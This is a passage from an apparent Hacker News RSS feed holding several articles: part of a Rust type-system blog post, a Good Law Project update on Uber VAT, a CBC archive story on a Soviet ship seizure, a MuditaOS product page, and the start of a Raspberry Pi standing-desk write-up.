<p>However, starting out, there are a few obvious differences I'd put into the "quirks" category. They seem foreign and strange, but acclimatisation comes quickly. I'll only briefly touch on them for those who've never seen Rust before. Exhaustive coverage exists in <a href="https://doc.rust-lang.org/book/ch05-00-structs.html" target="_blank" rel="nofollow noopener noreferrer">the Rust book</a> and <a href="https://fasterthanli.me/articles/i-am-a-java-csharp-c-or-cplusplus-dev-time-to-do-some-rust" target="_blank" rel="nofollow noopener noreferrer">elsewhere</a>.</p>
<p><strong> Rust doesn't have <code>classes</code> and only uses <code>structs</code>:</strong>   </p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>  </pre>
<p><em>"Cool cool. Structs are kinda like classes anyway"</em></p>
<p><strong>Methods are defined in <code>impl</code> blocks instead of the <code>struct</code> definition: </strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>

<span>impl</span> <span>MyData</span> <span>{</span>

	<span>pub</span> <span>fn</span> <span>init</span><span>(</span>x<span>:</span><span>f32</span><span>,</span> y<span>:</span><span>f32</span><span>,</span> z<span>:</span><span>f32</span><span>)</span><span>-&gt;</span> <span>MyData</span><span>{</span>
	
		
		<span>MyData</span><span>{</span>
			x<span>,</span>
			y<span>,</span>
			z<span>,</span>
		<span>}</span>
	<span>}</span>
<span>}</span></pre>
<p> <em>"Okay, separate <code>impl</code> blocks seem like a weird choice. Kinda reminds me of <code>C</code> header files..."</em></p>
<p> Calling methods defined in types is done with a <code>C++</code> like syntax, e.g. <code>Type::method_name()</code>. However, once an instance exists (aka memory has been allocated), members are accessed with regular dot syntax, e.g. <code>instance.method_name()</code>:</p>
<pre><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span> 
    
    <span>let</span> y <span>=</span> position<span>.</span>y<span>;</span> 
<span>}</span></pre>
<p><strong>There's no inheritance. Shared behaviours are defined in <code>Traits</code>.</strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>


<span>trait</span> <span>Drawable</span> <span>{</span>
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span><span>;</span>
<span>}</span>


<span>impl</span> <span>Drawable</span> <span>for</span> <span>MyData</span> <span>{</span>
	
	
	
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>{</span>
        
    <span>}</span>
<span>}</span></pre>
<p><em>"Okay, so like <code>Trait</code> is just a different way to spell <code>Interface</code>? Gotcha. But no inheritance? That's pretty wild. But composition over inheritance, am I right?"</em></p>
<p>Now that we've implemented the <code>Drawable</code> Trait, we can call its methods on our struct: </p>
<pre><span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span>

position<span>.</span><span>draw</span><span>(</span><span>)</span><span>;</span> </pre>
<p>That's enough for now, but know there are other plenty of other commendable <a href="https://stevedonovan.github.io/rust-gentle-intro/2-structs-enums-lifetimes.html" target="_blank" rel="nofollow noopener noreferrer">type features</a>, some of which we'll discuss later.</p>
<h2 id="where-the-functional-rubber-meets-the-road">Where the Functional Rubber Meets the Road</h2>
<p>Giant monolithic classes are considered a code smell. A signal that responsibilities need to be separated into separate concerns. Still, OOP maintains the feeling of discrete units. Data and behaviour are contained within the cell walls of the class, or at least within the inheritance chain.   </p>
<p>Rust, by comparison, feels inside out, "itty bitty" and piecemeal. What might have been a single class is instead an accumulation of structs and traits, each defining their own narrow window into data and behaviour. <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank" rel="nofollow noopener noreferrer">In this talk</a>, the creator of Clojure, another functional language, describes this quality as "ad-hoc polymorphism". Using only what you need, when you need it. This granular approach maximises the immutable surface area, mutability is limited to where it's necessary.   </p>
<p>In the flame wars of "was OOP a giant mistake?", it's debatable whether <a href="https://stevedonovan.github.io/rust-gentle-intro/object-orientation.html" target="_blank" rel="nofollow noopener noreferrer">Rust allows you to write OOP code</a>. I understand this now not as a wholesale rejection: abstraction and encapsulation remain necessary tools. However, Rust forces you to leave behind features ardents consider harmful, inheritance being the obvious example. Call it "OOP, the good bits" if you will. </p>
<p>Ideas like composition over inheritance or separating data from behaviour have been around for a long time within the OOP world. However, FP encourages new principles, determinism and the avoidance of side effects. Let's look at an example. </p>
<h3 id="fixing-the-billion-dollar-mistake">Fixing the Billion Dollar Mistake</h3>
<p>Tony Hoare, the inventor of the null pointer called it <a href="https://en.wikipedia.org/wiki/Tony_Hoare#Apologies_and_retractions" target="_blank" rel="nofollow noopener noreferrer">his billion-dollar mistake</a>. Any programmer knows the misery of finding an error log littered with <code>Null Reference Exception</code>. But <code>null</code> values are fundamental, like the oxygen we breathe. Whenever I tried to contemplate an alternative I suffered a failure of imagination. <em>"No null values? Far out man."</em> </p>
<p>For a while, in prior languages, I attempted to answer this question by initialising variables with a default value instead of <code>null</code>. That worked when the default value meant something, otherwise, it just piped junk data into the system. Still, in successful cases, I began to appreciate the guarantee  it offered. Any downstream code could trust a variable would be valid and not have to muddy itself with unexpected exceptions.</p>
<p>Software is such that, unfortunately, there will always be cases where initialisation or access of a resource fails. FP provides us with a more complete answer here. It …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thefuntastic.com/blog/fighting-rusts-type-system">https://thefuntastic.com/blog/fighting-rusts-type-system</a></em></p>]]>
            </description>
            <link>https://thefuntastic.com/blog/fighting-rusts-type-system</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867610</guid>
            <pubDate>Fri, 23 Oct 2020 09:42:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Law Project Forces HMRC to Collect £1.5bn in VAT from Uber]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24867410">thread link</a>) | @davidgerard
<br/>
October 23, 2020 | https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/ | <a href="https://web.archive.org/web/*/https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>
<hr>
<p><span>It is only with your support that we can continue to hold Government to account. If you would like to make a donation, you can do so</span>Â&nbsp;<a href="https://goodlawproject.org/membership">here</a>.</p>
            </div>
        </div>

        
    </div></div>]]>
            </description>
            <link>https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867410</guid>
            <pubDate>Fri, 23 Oct 2020 09:10:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Canadian printer who successfully sued the Soviet Union]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24867358">thread link</a>) | @fraqed
<br/>
October 23, 2020 | https://www.cbc.ca/archives/soviet-ship-seizure-solution-1.5763649?cmp=rss | <a href="https://web.archive.org/web/*/https://www.cbc.ca/archives/soviet-ship-seizure-solution-1.5763649?cmp=rss">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>After being stiffed by the Soviets for a job he did in 1967, Wally Edwards had one of their ships seized to extract his money in 1980.</p><div><p><span><span><div><div role="button" tabindex="0" title="Soviet seizure success"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/305/863/edwards_cash_1280x720_1807440963895.jpg" alt=""></p></div></div></div><span>Printer Wally Edwards successfully extracts a debt owed him by the Soviets in 1980.<!-- --> <!-- -->2:27</span></span></span></p><p><span><p>After being stiffed by the Soviets for an Expo 67 job they'd hired him for, printer Wally Edwards finally got paid 13 years later.</p>  <p>And he did it by having one of their ships seized when it was docked in the harbour in Toronto.</p>  <p>In doing so, Edwards had showed Soviet officials "he had no intention of letting them off the hook," said the CBC's Knowlton Nash on <em>The National </em>on Oct. 22, 1980.</p>  <p>That was the day he celebrated his vindication "in grand style," said Nash.</p>  <h2>An attention-getting gambit</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/mv-stanislavskiy.jpg 300w,https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/mv-stanislavskiy.jpg 460w,https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/mv-stanislavskiy.jpg 620w,https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/mv-stanislavskiy.jpg 780w,https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/mv-stanislavskiy.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5763732.1602794239!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/mv-stanislavskiy.jpg"></p></div><figcaption>Edwards had managed to have the sheriff seize the Soviet ship MV Stanislavskiy to force the Soviet Union to pay up.<!-- --> <!-- -->(The National/CBC Archives)</figcaption></figure></span>&nbsp;</p>  <p>Nineteen days earlier, the MV Stanislavskiy&nbsp;had been arrested in Toronto by the sheriff's office.</p>  <p>"That got the Russians' attention," said reporter Sheldon Turcott.</p>  <p>According to the Globe and Mail, the sheriff's office had been empowered to do so when Edwards had won a court order two months earlier.&nbsp;</p>  <p>But, Turcott&nbsp;explained,&nbsp;the Soviets&nbsp;didn't start to negotiate until after they were served with "a writ&nbsp;to freeze the Soviet embassy's bank account in Ottawa."</p>  <p>In a room at Toronto's Royal York Hotel festooned with Canadian&nbsp;flags, Edwards held a press conference that doubled as a party.</p>  <p>"It had all the flavour of a victory party following a Canada-Russia hockey series," said the reporter, as people were seen mingling while <em>O Canada</em> played in the background.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <h2>Gratitude for lawyers</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/ian-tod.jpg 300w,https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/ian-tod.jpg 460w,https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/ian-tod.jpg 620w,https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ian-tod.jpg 780w,https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/ian-tod.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5763742.1602794026!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ian-tod.jpg"></p></div><figcaption>"We've been successful at obtaining money from a foreign government," said lawyer Ian Tod, whose fee was also paid by the Soviets.<!-- --> <!-- -->(The National/CBC Archives)</figcaption></figure></span></p>  <p>As the camera rolled, Edwards presented his lawyers, Ian Tod and Ron Manes, with commemorative tankards.</p>  <p>But the show wasn't over: Edwards then&nbsp;unpacked bundles of dollar bills —&nbsp;36,000 of them —&nbsp;from a burlap sack. The resulting stack&nbsp;was a vivid picture of the money owed him, and paid, by the Soviets.&nbsp;</p>  <p>"Edwards had insisted it be paid in small bills so it would make a better show," said Turcott.</p>  <p>The Soviets had also paid the lawyers' fees of about $30,000, and thrown in something extra at Edwards's behest.</p>  <p>"Edwards asked for, and got, a case of caviar and vodka to seal the deal," said Turcott.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/vodka.jpg 300w,https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/vodka.jpg 460w,https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/vodka.jpg 620w,https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/vodka.jpg 780w,https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/vodka.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5763724.1603300557!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/vodka.jpg"></p></div><figcaption>Besides the money that was owed him by the Soviets, Wally Edwards asked for, and received, a bonus of vodka and caviar. <!-- --> <!-- -->(The National/CBC Archives)</figcaption></figure></span></p>  <p>But the story wasn't quite over.</p>  <p>"In order to seize the Russian ship, Edwards and his lawyers had to sue the sheriff for not doing his duty," said Turcott, sitting next the the pile of $1 bills. "Now they think they might have a good case to sue the sheriff to recover their costs for that effort."</p>  <p>In a postscript, Nash — smiling after watching the report —&nbsp;said there was an "ironic twist."</p>  <p>A&nbsp;woman who had once worked for Edwards showed up at the party.</p>  <p>"And she claimed she was not paid when Edwards' company went bankrupt in 1973," said the&nbsp;host.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/archives/soviet-ship-seizure-solution-1.5763649?cmp=rss</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867358</guid>
            <pubDate>Fri, 23 Oct 2020 09:02:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MuditaOS: An open-source, e-ink mobile OS]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24867163">thread link</a>) | @ajeetdsouza
<br/>
October 23, 2020 | https://mudita.com/products/pure/muditaos/ | <a href="https://web.archive.org/web/*/https://mudita.com/products/pure/muditaos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><section><div><h2>Minimalistic, yet powerful</h2><p>Developing our mobile operating system has been a big challenge in the process of creating Mudita Pure. We came up with a beautifully designed E Ink mobile OS and open-sourced it to fully meet our users’ desire for quality and transparency.</p></div><div><p><strong>MuditaOS is Open Source
</strong>Sign up for the Developer Preview</p><p><a href="https://choosemindfully.typeform.com/to/dx9opXx0" target="_blank" rel="noopener">Sign up</a></p></div></section></div><section><section><ul><li><img src="https://images.ctfassets.net/isxmxtc67n72/3hjsX9fWYKOfxQ0lrObXr1/091a7ce4eb1d122d87e6145da1f06d1c/design.svg" alt=""><div><h3>Beautiful design
and usability</h3></div></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/5g3Xmhql9u20s0yXYslf8n/3d049ba9f55f6fa00a300b09e8de7762/mudita_pure.svg" alt=""><div><h3>Created specifically
for Mudita Pure</h3></div></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/2VTHlXxVr9vDSHIpt6CGU5/dd00f9d362edf576cd9b40d988ee25ba/desktop_app.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/5UEKiR3TPJ1nVPQj2VH17W/3dc0885a2c90c8992ed788288d3602a5/open_source.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/7HbQAxMuhVx3JuafIPIuRm/7f3d7bf3bcedb8647f59dc1f52b3bcfa/security.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/QfDEbsDMjphtfyZ3Mmm7u/07ca8df0fddb335da1bfa4f67e423f47/e-ink-optimizes.svg" alt=""><div><h3>Optimized for E Ink display</h3></div></li></ul></section></section><section><article><h2>Grouping features</h2><p>All of the teams were involved in this process. 
We prepared a list of general functionalities that Mudita Pure should have, and then divided them into particular applications and tools.</p></article></section><section><p><u>We divided them into 11 sections</u> that became the fundamentals for building the main functionalities of Mudita Pure:</p><ul><li><img src="https://images.ctfassets.net/isxmxtc67n72/1EBRYBzBFPvFBaEbv7MilN/49ed681af05355eea054e02cce1efc75/home_screen.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/7qfRBSpIgus3mgsfLJAFdu/3bcdf65e69a1f111b809e7e67066603d/call_logs.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/4fFRU6A82Pdv2VFtXwswch/47f2139bcb26630b22136b51de4c2960/phonebook-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/7bTNPeZ2xwdLiJiTbV7Tzm/a1cc98651dc7afe26f778f2ef22b10cc/messaging-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/3ZrA2P47X5BWjMRXWWOW6P/2cb4b48f1237e069b1de64890f6f3433/settings-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/3KuZE2VdSDNjq963BEUoKo/f4de45d80f736ac2f69b7988ee8c04a2/music_player-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/3aHauUnGrmedxe0v6G6sCD/a9abafea14cbbad96228314995ceaffb/alarm_clock.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/6a4UXE8QugkL7dmyab0HZW/ceb5f0872f1d007830bfa1ce650b5a60/calendar-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/4jZTbSf8Va2DoAqlldAcDk/20ed39f9c154737e3c8e7bbb069ca77a/meditation_timer.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/73iRHxVAfFWXS3lnXaARgy/b17902daf509726ecd160b4adb3e87b1/tools-1.svg" alt=""></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/BhNzQBq8gfcO7ZJFWOlnE/a820008fbf3168d7cd007d4c3eec6ce6/onboarding-1.svg" alt=""></li></ul></section><section><article><h2>User flows</h2><p>For each application, we prepared a separate diagram, which not only showed the functionalities, but also the connections between them and the possible paths that a user could take.</p></article></section><section><div><p>The design team at Mudita needed to prepare a visual representation of all the possible actions and a screen for every step that a user would take. This was a long and complicated process that took into account <u>great usability, technical requirements and our love for beautiful design.</u> Usability testing was also a big part of the design process as we wanted to get feedback as soon as possible.</p></div><ul><li></li><li></li><li></li><li></li></ul></section><section><article><h2>Designing for E Ink screen</h2><p>We tested the E Ink screen and defined the detailed guidelines for further design decisions that would be optimized for this technology. We also wanted the user interface to be <u>intuitive, readable and understandable</u> regardless of the action performed. 

Our designers were looking for the elements such as the thickness of the lines, sizes of the fonts, or spacing. While testing different styles, using several shades of gray, adding and removing elements, we’ve come to the conclusion that a <u>clear, simple design, using mostly black ink, was the best answer.
</u></p></article></section><section><article><h2>We set our expectations high and we now have over 300 screens that meet all of our requirements.</h2></article></section><section><article><h2>An extension of MuditaOS</h2><p>Mudita Center is an additional element of MuditaOS that we’ve been developing simultaneously. It allows us to expand and update the features of Mudita Pure, while <u>using a computer, and keep the phone minimalist at the same time.</u></p><img src="https://images.ctfassets.net/isxmxtc67n72/27FMb2eg3yXB7MjeU6JUOp/d711d59e5c664ea0546efcc65df6d966/operating_systems.png" alt="operating systems"></article></section><section><article><h2>What can you do using Mudita Center</h2></article></section><div><div><div><div><h2>Upload and manage
audio on Pure</h2></div><div><h2>Export notes and voice memos</h2></div><div><h2>Create longer messages
and notes</h2></div><div><h2>Use Pure as a mobile hotspot</h2></div></div></div></div><section><article><h2>Optimized for the device</h2><p>MuditaOS has been designed to be the best performing, <u>E Ink optimized operating system</u> that fits Mudita Pure perfectly. Building an operating system optimized for a specific device gave us <u>full control over the hardware and enabled getting the best out of its technical specs.</u></p></article></section><section><article><h2>Addressing technical requirements</h2><p><u>Every little detail needs to be addressed.</u> We worked on several elements in-house such as: HAL - the Hardware Abstraction Layer between the hardware and the OS, the bootloader, the role of which is to configure the hardware to a level that allows the operating system to boot, a database for storing contact information and messages and a system manager that restores the system after switching on the phone, monitors the system status or performs the initial start-up etc.</p></article></section><section><div><h2>Overcoming challenges</h2><p>The implementation of many services was challenging, especially for the GSM module, which is one of the most complex modules in Mudita Pure. The goal was to create an operating system that is as close to the device as possible, easy to maintain and is not a performance overkill.</p></div><ul><li><img src="https://images.ctfassets.net/isxmxtc67n72/1PHdtM9otJxy2TjTi2fsSk/c0fab15f1ee10bf2ee8c0879857c7108/Eink.svg" alt=""><div><h3>E Ink display</h3><p>The E Ink display is a crucial component that we needed to take into account when developing MuditaOS. We had to make sure that all of the operations are optimized for E Ink and are running smoothly.</p></div></li><li><img src="https://images.ctfassets.net/isxmxtc67n72/47XaG2qKrmASQDktmG7Pzw/a4ef7eb68f886939587d58d3a7cec612/audio_system.svg" alt=""><div><h3>Audio system</h3><p>When working on the audio system, it was important not only to choose the right components, but also to implement an audio service. This way the Harman speaker will play your favorite tunes in MP3, WAV and FLAC formats!</p></div></li></ul></section><section><article><p><u>Open Source means transparency, quality and cooperation.</u> These values are with us from day one, so we’re proud to give you a fully open operating system and encourage you to become a part of MuditaOS Open Source community!</p></article></section><section><article><p>We believe that open-sourcing MuditaOS goes along the line of our "You're happy - I'm Happy" philosophy. By opening our minimalistic, yet powerful operating system, we're giving our community the ability to <u>take a look inside, tinker with it, and get creative with building new functionalities or customizing MuditaOS</u> according to their needs.</p></article><article><p><u>Open Source is also about quality.</u> More eyes and hands on the code equal more bug fixes and stronger code security. We want our devices to serve their purpose as long as possible, so having an Open Source operating system means longevity and sustainability.</p></article></section><section><article><p><u>MuditaOS is Open Source.</u> Sign up for the Developer Preview and feel free to contribute and make MuditaOS better for everyone, developers and non-developers alike.</p><a href="https://choosemindfully.typeform.com/to/dx9opXx0" target="_blank" rel="noopener">Sign up</a></article></section></div></div>]]>
            </description>
            <link>https://mudita.com/products/pure/muditaos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867163</guid>
            <pubDate>Fri, 23 Oct 2020 08:23:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Home Made Raspberry Pi Standing Desk Controller]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 40 (<a href="https://news.ycombinator.com/item?id=24867077">thread link</a>) | @tomahony
<br/>
October 23, 2020 | https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller | <a href="https://web.archive.org/web/*/https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p><time title="14 days, 22 hours, and 12 minutes ago." datetime="2020-10-11T11:14:00+01:00">Sunday 11 October 2020</time></p><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none" alt="DSC03717" title="DSC03717" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none"></figure></div></section><section><div><p>I have a <a href="https://www.conset.com/Product/prod/4333/501-49" target="_blank" rel="noreferrer noopener">Conset 501-49</a> sit/stand desk at home. It's a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons. This makes it tedious to find the correct height and means you usually just don't bother getting up and standing, making it a rather expensive sit-only-desk.</p><p>Over the lockdown, I decided to improve this by replacing the original buttons with a Raspberry Pi powered controller that would allow me to raise and lower my desk at the click of a single button.<br></p></div></section><section><p>Here's a closer look at it sitting under my desk:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none" alt="DSC03725" title="DSC03725" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none"></figure></div></section><section><div><p>This is <a href="https://shop.pimoroni.com/products/display-o-tron-hat" target="_blank" rel="noreferrer noopener">a DisplayOTron HAT that I bought from Pimoroni</a> a few years ago and never had a proper use for. Thankfully this hat is perfect for this project.</p><ul><li>On the <strong>front</strong> is a LCD display that shows the current height from the ground. This could be reprogrammed to show anything: animations, time standing or sitting, last time the desk was raised or lowered etc. <br></li><li>On the <strong>left</strong> of the display you'll see up/down capacitive buttons. These are programmed to allow me to manually raise or lower the desk, just like the original buttons. <br></li><li>Along the <strong>bottom</strong> are the preset buttons. Hitting the left arrow lowers the desk to my pre-programmed "ground" setting where it's comfortable for me to sit (around 60cm off the ground) while right arrow button raises it to my preset standing position (120cm).</li><li>Along the <strong>right</strong> there's a light-bar. This is really just a decoration, showing the current position of the desk. They light-up individually as the desk goes up. Like a 1-dimensional Christmas tree.<br></li></ul></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none" alt="DSC03731" title="DSC03731" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none"><figcaption>
													Superglue, picture hooks and velcro sticky things
																	</figcaption></figure></div></section><section></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_5056.gif?mtime=20201011125820&amp;focal=none" alt="IMG 5056" title="IMG 5056"></figure></div></section><section><div><p>So how does it work?<br></p><p>The relays on the Raspberry Pi allow us to control the underlying electrical circuit to raise/lower the desk via the RPIO's GPIO pins.</p><p>The height sensor detects how high the desk is currently off the ground and allows us to start/stop the motor via the above relays. <br></p><p>Finally, the display allows us to control everything as well as display the current height of the desk.</p><p>There were a few general stages to getting this working:</p><ol><li>Figuring out how the existing switches and motor work.<br></li><li>Replacing the default physical switches with relays.</li><li>Adding the height-sensor.</li><li>Programming everything together.</li></ol><h2>Figuring it Out</h2></div></section><section><p>Admission: I don't know what I'm doing - electricity is magic that spews from the wall, so a lot of this was just me poking an prodding at things while making sure I didn't electrocute myself. Be careful.</p></section><section><div><p>Here's what I knew: my desk had a big black motor sitting underneath. It raised and lowered the table. There were a few wires coming out of it connected to its build-in switch.<br></p><p>To learn more, the first thing I did was open (and effectively destroy) the default switch, to see how it worked inside<br></p></div></section><section><p>Top Tip: destroy things as early as possible so that <em>you have to</em> finish the project</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none" alt="IMG 4424" title="IMG 4424" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none"></figure></div></section><section><div><p>At a basic level it's easy to understand what <a href="https://uk.rs-online.com/web/p/microswitches/2900479/" target="_blank" rel="noreferrer noopener">these switches</a> do: they control how electricity flows to the motor. The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural <sup>[citation needed]</sup><br></p><p>To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail. To do this, I cut the switches out (after taking a number of inadequate pictures) and created my own battery-powered circuit to see it in action.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none" alt="IMG 4445" title="IMG 4445" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none"><figcaption>
													It's a mess, but this circuit actually mimics the desk. There are two leds on the breadboard. These lighting up represent the desk raising or lowering.
